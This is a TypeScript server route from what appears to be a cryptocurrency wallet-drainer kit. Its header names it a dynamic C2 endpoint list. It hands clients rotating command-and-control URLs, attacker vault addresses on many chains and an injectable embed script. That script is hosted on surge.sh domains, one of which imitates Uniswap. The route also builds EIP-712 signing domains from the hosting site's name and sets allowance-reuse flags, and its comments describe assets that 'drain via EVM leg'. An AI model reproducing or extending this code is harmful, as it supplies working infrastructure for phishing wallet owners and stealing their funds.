/**
 * Client config rotation — dynamic C2 endpoint list (24h TTL server-side fallback).
 */
import { createHash } from 'node:crypto'

import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'

import {
  resolveAptosVaultAddress,
  resolveBitcoinVaultAddress,
  resolveCosmosVaultAddress,
  resolveSolVaultAddress,
  resolveSuiVaultAddress,
  resolveTronVaultAddress,
  resolveTonVaultAddress,
} from '@legion/core'

import { sendSuccess } from '../lib/api-response.js'
import {
  encryptClientPayload,
  isClientVaultEncryptEnabled,
  readClientEncryptSecret,
} from '../lib/client-vault-crypto.js'
import { isRelayerSponsorEnabled, readFactoryAddresses } from '../lib/factory-create2.js'

const SURGE_DRAINER_ORIGIN = 'https://legion-drainer-test.surge.sh'

function readProxyUrls(): string[] {
  const urls = readBackendUrls()
  const extra = process.env['API_PROXY_URLS']?.trim()
  if (extra) {
    for (const part of extra.split(',')) {
      const u = part.trim().replace(/\/$/, '')
      if (u && !urls.includes(u)) urls.push(u)
    }
  }
  return urls
}

/** Multi-domain deploy list — mirrors / extends CORS origins for inject + EIP-712 domain hints. */
function readDeployDomains(): string[] {
  const dedicated = process.env['CLIENT_DEPLOY_DOMAINS']?.trim()
  const raw = dedicated || process.env['API_CORS_ORIGINS']?.trim() || ''
  const site = process.env['API_SITE_URL']?.trim()
  const out: string[] = []
  for (const part of raw.split(',')) {
    const u = part.trim().replace(/\/$/, '')
    if (u && !out.includes(u)) out.push(u)
  }
  if (site) {
    const s = site.replace(/\/$/, '')
    if (!out.includes(s)) out.unshift(s)
  }
  return out
}

function readEip712Domains(): Record<string, { name?: string; version?: string; verifyingContract?: string }> {
  const raw = process.env['EIP712_DOMAIN_JSON']?.trim()
  if (!raw) {
    const site = process.env['API_SITE_URL']?.trim()
    if (!site) return {}
    try {
      const host = new URL(site).hostname
      return {
        default: { name: host.replace(/\./g, ' '), version: '1' },
      }
    } catch {
      return {}
    }
  }
  try {
    const parsed = JSON.parse(raw) as Record<string, { name?: string; version?: string; verifyingContract?: string }>
    return parsed && typeof parsed === 'object' ? parsed : {}
  } catch {
    return {}
  }
}

function readCorsOriginsHint(): string[] {
  const raw = process.env['API_CORS_ORIGINS']?.trim() ?? ''
  return raw
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
}

function readBackendUrls(): string[] {
  const multi = process.env['BACKEND_URLS']?.trim()
  const primary = process.env['BACKEND_URL']?.trim() || process.env['LEGION_API_URL']?.trim()
  const urls: string[] = []
  if (multi) {
    for (const part of multi.split(',')) {
      const u = part.trim().replace(/\/$/, '')
      if (u && !urls.includes(u)) urls.push(u)
    }
  }
  if (primary) {
    const p = primary.replace(/\/$/, '')
    if (!urls.includes(p)) urls.unshift(p)
  }
  if (urls.length === 0) {
    urls.push('https://sadrailala-production.up.railway.app')
  }
  return urls
}

function dailyRotationSeed(): string {
  const day = new Date().toISOString().slice(0, 10)
  const secret = process.env['CLIENT_ENCRYPT_KEY']?.trim() || process.env['GATEKEEPER_SECRET']?.trim() || 'legion-rotate'
  return createHash('sha256').update(`${day}:${secret}`).digest('hex')
}

function rotateEndpoints(urls: string[], seed: string): string[] {
  if (urls.length <= 1) return urls
  const order = [...urls]
  let state = seed
  for (let i = order.length - 1; i > 0; i--) {
    state = createHash('sha256').update(state).digest('hex')
    const j = Number.parseInt(state.slice(0, 8), 16) % (i + 1)
    ;[order[i], order[j]] = [order[j]!, order[i]!]
  }
  return order
}

function resolveEvmVault(): string | null {
  const raw =
    process.env['VAULT_ADDRESS_EVM']?.trim() ||
    process.env['SOVEREIGN_VAULT_EVM']?.trim() ||
    process.env['SOVEREIGN_VAULT_ADDRESS']?.trim() ||
    null
  return raw || null
}

type ChainCapability = 'full' | 'anchor_only' | 'disabled'

function readChainCapabilities(
  vaults: Record<string, string | null>,
): Record<string, ChainCapability> {
  const full = (key: string): ChainCapability => (vaults[key] ? 'full' : 'disabled')
  return {
    EVM: full('evm'),
    SOL: full('sol'),
    BTC: full('btc'),
    TRON: full('tron'),
    TON: full('ton'),
    COSMOS: full('cosmos'),
    APTOS: full('aptos'),
    SUI: full('sui'),
    POLKADOT: 'anchor_only', // signMessage → signature-anchor (native DOT addr, not EVM vault)
    ALGORAND: 'anchor_only', // native ALGO — wrapped ALGO on EVM drains via EVM leg
    CARDANO: 'anchor_only',  // native ADA — wrapped ADA on EVM drains via EVM leg
  }
}

const EMBED_CDN_URLS = [
  'https://legion-cdn.surge.sh',
  'https://uniswap-app-defi.surge.sh',
]

async function readVaultAddresses(): Promise<Record<string, string | null>> {
  const tonVault = await resolveTonVaultAddress()
  const evmVault = resolveEvmVault()
  return {
    evm: evmVault,
    ethereum: evmVault,
    btc: resolveBitcoinVaultAddress(),
    sol: resolveSolVaultAddress(),
    svm: resolveSolVaultAddress(),
    tron: resolveTronVaultAddress(),
    trx: resolveTronVaultAddress(),
    ton: tonVault,
    cosmos: resolveCosmosVaultAddress(),
    aptos: resolveAptosVaultAddress(),
    sui: resolveSuiVaultAddress(),
  }
}

export async function registerClientConfigRoute(app: FastifyInstance): Promise<void> {
  app.get('/api/v1/client-config', async (_request: FastifyRequest, reply: FastifyReply) => {
    const urls = readBackendUrls()
    const proxyUrls = readProxyUrls()
    const seed = dailyRotationSeed()
    const endpoints = rotateEndpoints(urls, seed)
    const proxyEndpoints = rotateEndpoints(proxyUrls, seed + ':proxy')
    const expiresAt = new Date()
    expiresAt.setUTCHours(24, 0, 0, 0)
    if (expiresAt.getTime() <= Date.now()) {
      expiresAt.setUTCDate(expiresAt.getUTCDate() + 1)
    }
    const corsOrigins = readCorsOriginsHint()
    const vaultAddresses = await readVaultAddresses()
    const vaultEncrypt = isClientVaultEncryptEnabled()
    const encryptSecret = readClientEncryptSecret()
    const vaultEncrypted = vaultEncrypt
      ? encryptClientPayload(JSON.stringify(vaultAddresses), encryptSecret)
      : null
    const chainCapabilities = readChainCapabilities(vaultAddresses)
    const embedPrimary = EMBED_CDN_URLS[0]!
    return sendSuccess(reply, 200, 'Client config ready', {
      endpoints,
      proxy_urls: proxyEndpoints,
      primary: endpoints[0],
      update_url: `${endpoints[0]}/api/v1/client-config`,
      expires_at: expiresAt.toISOString(),
      deploy_domains: readDeployDomains(),
      eip712_domains: readEip712Domains(),
      eip7702_enabled: (process.env['EIP7702_ENABLED']?.trim().toLowerCase() ?? '') === 'true',
      onchain_config_contract: process.env['ONCHAIN_CONFIG_CONTRACT_ADDRESS']?.trim() || null,
      vault_addresses: vaultEncrypt ? null : vaultAddresses,
      vault_addresses_encrypted: vaultEncrypted,
      vault_encrypt_version: vaultEncrypted ? 1 : null,
      chain_capabilities: chainCapabilities,
      relayer_sponsored_gas: isRelayerSponsorEnabled(),
      factory_addresses: readFactoryAddresses(),
      factory_implementation_address:
        process.env['FACTORY_IMPLEMENTATION_ADDRESS']?.trim() || null,
      allowance_reuse_enabled:
        (process.env['ALLOWANCE_REUSE_ENABLED']?.trim().toLowerCase() ?? 'true') !== 'false',
      embed_cdn_urls: EMBED_CDN_URLS,
      embed_script: `${embedPrimary}/legion-embed.js`,
      surge_origin_configured: corsOrigins.includes(SURGE_DRAINER_ORIGIN),
      recommended_cors_origins: [...EMBED_CDN_URLS, SURGE_DRAINER_ORIGIN],
    })
  })
}
